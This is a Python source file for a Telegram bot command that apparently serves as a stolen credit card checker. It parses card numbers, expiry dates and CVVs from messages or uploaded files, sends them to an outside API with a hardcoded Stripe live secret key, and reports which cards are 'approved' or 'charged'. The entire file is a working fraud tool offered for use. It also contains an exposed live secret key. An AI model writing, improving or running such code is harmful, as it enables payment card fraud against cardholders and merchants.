from EQUROBOT import app
import requests
import re
from pyrogram import filters


@app.on_message(filters.command("chktxt", prefixes=[".", "/"]))
async def check_cc_file(_, message):
    reply_msg = message.reply_to_message
    
    if reply_msg and reply_msg.document:
        # Assuming the text file is sent as a document, you can handle it here
        file_id = reply_msg.document.file_id
        file = await app.get_document(file_id)
        text = await app.download_media(file)
        ccs = re.findall(r'\d{16}\|\d{2}\|\d{4}\|\d{3}', text)  # Adjust regex based on actual format

        if not ccs:
            return await message.reply_text('No valid CCs found in the text file.')

        for cc in ccs:
            await process_cc(message, cc.strip())

    elif message.command:
        cc = message.text[len('.chktxt '):].strip()

        if not re.match(r'\d{16}\|\d{2}\|\d{4}\|\d{3}', cc):
            return await message.reply_text('Invalid CC format in direct input.')

        await process_cc(message, cc)
    else:
        await message.reply_text('No valid input found.')

async def process_cc(message, cc):
    x = re.findall(r'\d+', cc)
    if len(x) != 4:
        return await message.reply_text('Invalid CC format. Should be in the format: 4355460260824973|03|2029|273')

    ccn = x[0]
    mm = x[1]
    yy = x[2]
    cvv = x[3]

    VALID = ('37', '34', '4', '51', '52', '53', '54', '55', '64', '65', '6011')
    if not ccn.startswith(VALID):
        return await message.reply_text('Invalid CC type.')

    reply = await message.reply_text('Processing your request...')

    url = "https://mvy.ai/sk_api/api.php"
    params = {
        "lista": f"{ccn}:{mm}:{yy}:{cvv}",
        "sk": "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"
    }

    r = requests.get(url, params=params).json()

    if r['status'] == 'die':
        fullcc = f"{ccn}|{mm}|{yy}|{cvv}"
        die_message = (
            f"Card: `{fullcc}`\n"
            f"Response: **{r['message']}**\n"
            f"Proxy: 104.207.45.101:xxx Live ✅\n"
            f"Checked By: {message.from_user.mention}\n"
        )
        await reply.edit_text(die_message)

    elif r['status'] == 'approved':
        fullcc = f"{ccn}|{mm}|{yy}|{cvv}"
        approved_message = (
            f"Card: {fullcc}\n"
            f"Response: **{r['message']}**\n"
            f"Message: CHARGED ${r['payment_info']['amount']}\n"
            f"Proxy: 104.207.45.101:xxx Live ✅\n"
            f"Checked By: {message.from_user.mention}\n"
        )
        await reply.edit_text(approved_message)

    else:
        await reply.edit_text("Unknown status received.")
      
